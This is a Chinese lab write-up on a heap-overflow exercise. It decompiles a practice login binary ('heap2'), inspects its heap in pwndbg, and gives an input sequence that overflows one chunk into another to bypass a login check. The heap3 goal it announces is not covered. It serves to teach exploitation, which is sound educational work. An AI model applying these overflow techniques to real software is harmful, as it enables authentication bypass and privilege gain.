# 堆溢出实验3

## 实验概述

### 【目的】
1. 运行heap2，得到输出`you have logged in already!`
2. 运行heap3，得到输出`that wasn't too bad now, was it?`
### 【环境】
Linux
### 【工具】
python
### 【原理】
堆溢出是堆数据区中发生的一种缓冲区溢出。 堆溢出以与基于栈溢出不同的方式被利用。 堆上的内存由应用程序在运行时动态分配，通常包含程序数据。 通过以特定的方式破坏这些数据来执行开发，以使应用程序覆盖诸如链接列表指针的内部结构。 规范堆溢出技术覆盖动态内存分配链接（如malloc元数据），并使用生成的指针交换来覆盖程序函数指针。
## 实验步骤

### 【步骤】
#### heap2

打开IDA pro，分析伪代码。
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@14
  int v4; // ecx@14
  char s; // [sp+1Ch] [bp-8Ch]@2
  _BYTE v6[3]; // [sp+21h] [bp-87h]@4
  int v7; // [sp+9Ch] [bp-Ch]@1

  v7 = *MK_FP(__GS__, 20);
  while ( 1 )
  {
    printf("[ auth = %p, service = %p ]\n", auth, service);
    if ( !fgets(&s, 128, stdin) )
      break;
    if ( !strncmp(&s, "auth ", 5u) )
    {
      auth = (char *)malloc(4u);
      memset(auth, 0, 4u);
      if ( strlen(v6) <= 0x1E )
        strcpy(auth, v6);
    }
    if ( !strncmp(&s, "reset", 5u) )
      free(auth);
    if ( !strncmp(&s, "service", 6u) )
      service = (int)strdup(&v6[2]);
    if ( !strncmp(&s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        puts("you have logged in already!");
      else
        puts("please enter your password");
    }
  }
  result = 0;
  v4 = *MK_FP(__GS__, 20) ^ v7;
  return result;
}
```

这是一个登陆验证程序，可以输入auth，reset，service和login来选择功能。
尝试用auht AAAA和serviceBBBB。
```
$ gdb heap2 -q
pwndbg: loaded 164 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from heap2...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/lometsj/prostar/heap2 
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804b818, service = (nil) ]
serviceBBBB
[ auth = 0x804b818, service = 0x804b828 ]
^C
Program received signal SIGINT, Interrupt.
0xf7fd7dc9 in __kernel_vsyscall ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
*EAX  0xfffffe00
 EBX  0x0
*ECX  0x804b410 ◂— 'serviceBBBB\n'
*EDX  0x400
*EDI  0xf7fb5d60 (_IO_2_1_stdout_) ◂— 0xfbad2a84
*ESI  0xf7fb55a0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*EBP  0xffffcd78 ◂— 0x7f
*ESP  0xffffcd28 —▸ 0xffffcd78 ◂— 0x7f
*EIP  0xf7fd7dc9 (__kernel_vsyscall+9) ◂— pop    ebp
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0xf7fd7dc9 <__kernel_vsyscall+9>     pop    ebp
   0xf7fd7dca <__kernel_vsyscall+10>    pop    edx
   0xf7fd7dcb <__kernel_vsyscall+11>    pop    ecx
   0xf7fd7dcc <__kernel_vsyscall+12>    ret    
    ↓
   0xf7ed8b23 <__read_nocancel+25>      pop    ebx
   0xf7ed8b24 <__read_nocancel+26>      cmp    eax, 0xfffff001
   0xf7ed8b29 <__read_nocancel+31>      jae    __syscall_error <0xf7e1b730>
    ↓
   0xf7e1b730 <__syscall_error>         call   __x86.get_pc_thunk.dx <0xf7f22b5d>
 
   0xf7e1b735 <__syscall_error+5>       add    edx, 0x1998cb
   0xf7e1b73b <__syscall_error+11>      mov    ecx, dword ptr gs:[0]
   0xf7e1b742 <__syscall_error+18>      neg    eax
─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0xffffcd28 —▸ 0xffffcd78 ◂— 0x7f
01:0004│      0xffffcd2c ◂— 0x400
02:0008│      0xffffcd30 —▸ 0x804b410 ◂— 'serviceBBBB\n'
03:000c│      0xffffcd34 —▸ 0xf7ed8b23 (__read_nocancel+25) ◂— pop    ebx
04:0010│      0xffffcd38 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
05:0014│      0xffffcd3c —▸ 0xf7e6d267 (_IO_file_underflow+295) ◂— add    esp, 0x10
06:0018│      0xffffcd40 ◂— 0x0
07:001c│      0xffffcd44 —▸ 0x804b410 ◂— 'serviceBBBB\n'
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 f7fd7dc9 __kernel_vsyscall+9
   f 1 f7ed8b23 __read_nocancel+25
   f 2 f7e6d267 _IO_file_underflow+295
   f 3 f7e6e237 _IO_default_uflow+23
   f 4 f7e6e02c __uflow+140
   f 5 f7e62291 _IO_getline_info+161
   f 6 f7e623ce _IO_getline+30
   f 7 f7e611ed fgets+157
   f 8  804869c main+97
   f 9 f7e1b637 __libc_start_main+247
Program received signal SIGINT
pwndbg> heap
Top Chunk: 0x804b830
Last Remainder: 0

0x804b000 PREV_INUSE {
  prev_size = 0, 
  size = 1033, 
  fd = 0x7561205b, 
  bk = 0x3d206874, 
  fd_nextsize = 0x38783020, 
  bk_nextsize = 0x38623430
}
0x804b408 PREV_INUSE {
  prev_size = 0, 
  size = 1033, 
  fd = 0x76726573, 
  bk = 0x42656369, 
  fd_nextsize = 0xa424242, 
  bk_nextsize = 0x0
}
0x804b810 FASTBIN {
  prev_size = 0, 
  size = 17, 
  fd = 0x41414141, 
  bk = 0xa, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x11
}
0x804b820 FASTBIN {
  prev_size = 0, 
  size = 17, 
  fd = 0x42424242, 
  bk = 0xa, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x207d1
}
0x804b830 PREV_INUSE {
  prev_size = 0, 
  size = 133073, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> x/32x 0x804b810
0x804b810:	0x00000000	0x00000011	0x41414141	0x0000000a
0x804b820:	0x00000000	0x00000011	0x42424242	0x0000000a
0x804b830:	0x00000000	0x000207d1	0x00000000	0x00000000
0x804b840:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b850:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b860:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b870:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b880:	0x00000000	0x00000000	0x00000000	0x00000000
pwndbg> 

```
要login成功需要auth+32处的值不为0即可，而service可以覆盖到auth+32。
```
$ ./heap2
[ auth = (nil), service = (nil) ]
auth 123
[ auth = 0x9d30818, service = (nil) ]
service 12341234123412341234123412341234
[ auth = 0x9d30818, service = 0x9d30828 ]
login
you have logged in already!

```


### 【总结】

本次实验主要熟悉Linux环境下堆溢出，尝试通过堆溢出覆盖（修改）相邻的堆块数据，获得更高权限。
可以发现，要使堆溢出发生，要满足以下条件：

- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。
